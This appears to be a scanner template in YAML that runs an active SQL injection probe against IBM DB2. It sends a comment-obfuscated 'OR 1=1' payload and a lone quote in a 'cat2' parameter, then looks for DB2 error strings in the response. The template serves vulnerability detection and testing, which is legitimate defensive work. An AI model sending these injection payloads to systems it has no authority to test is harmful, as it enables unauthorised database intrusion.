id: sqli6-db2-24
name: 'SQLi db2 probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - '''/**/OR/**/1=1--'
        - ''''
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
